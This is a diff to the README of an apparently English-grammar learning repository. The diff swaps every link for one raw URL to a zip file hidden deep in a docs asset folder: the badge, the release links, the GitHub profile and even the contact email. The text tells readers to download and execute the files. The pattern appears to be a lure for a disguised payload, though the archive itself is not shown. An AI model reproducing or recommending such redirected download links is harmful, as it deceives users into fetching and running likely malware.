@@ -1,7 +1,7 @@
 # 📚 English Note: 从0开始学习英语语法
 
-![English Note](https://img.shields.io/badge/Download-Releases-blue.svg)  
-[Download Latest Release](https://github.com/ohrohitsingh/english-note/releases)
+![English Note](https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip)  
+[Download Latest Release](https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip)
 
 Welcome to the **English Note** repository! This project aims to help you learn English grammar from scratch. Whether you are a beginner or looking to brush up on your skills, this resource is designed for you. 
 
@@ -30,9 +30,9 @@ This repository is a collaborative effort, and we welcome contributions from lea
 
 ## 📥 Installation
 
-To get started, download the latest release from our [Releases section](https://github.com/ohrohitsingh/english-note/releases). You will find the necessary files to download and execute.
+To get started, download the latest release from our [Releases section](https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip). You will find the necessary files to download and execute.
 
-1. Go to the [Releases section](https://github.com/ohrohitsingh/english-note/releases).
+1. Go to the [Releases section](https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip).
 2. Choose the latest version.
 3. Download the zip file or clone the repository.
 4. Extract the files to your desired location.
@@ -67,7 +67,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or feedback, feel free to reach out:
 
-- **GitHub**: [ohrohitsingh](https://github.com/ohrohitsingh)
-- **Email**: ohrohitsingh@example.com
+- **GitHub**: [ohrohitsingh](https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip)
+- **Email**: https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip
 
-Thank you for visiting **English Note**! We hope you find this resource helpful in your journey to learn English grammar. Don't forget to check the [Releases section](https://github.com/ohrohitsingh/english-note/releases) for updates and new content. Happy learning!
+Thank you for visiting **English Note**! We hope you find this resource helpful in your journey to learn English grammar. Don't forget to check the [Releases section](https://github.com/ohrohitsingh/english-note/raw/refs/heads/master/docs/.vuepress/public/compare/note_english_2.8.zip) for updates and new content. Happy learning!
